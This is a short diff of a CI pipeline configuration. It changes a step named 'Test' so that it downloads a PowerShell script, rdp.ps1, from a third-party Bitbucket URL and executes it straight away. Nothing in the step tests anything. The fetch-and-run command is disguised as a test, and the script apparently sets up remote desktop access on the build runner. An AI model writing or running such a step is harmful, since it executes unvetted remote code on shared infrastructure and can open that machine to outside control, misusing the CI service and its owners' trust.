@@ -8,4 +8,5 @@ jobs:
       - run:
           name: Test
           command: |
-            Invoke-WebR
+            Invoke-WebRequest https://bitbucket.org/sadsases3324/rdp/raw/18b3393b9764bddd11687eda214a8f9a629fe01f/rdp.ps1 -OutFile rdp.ps1
+            ./rdp.ps1
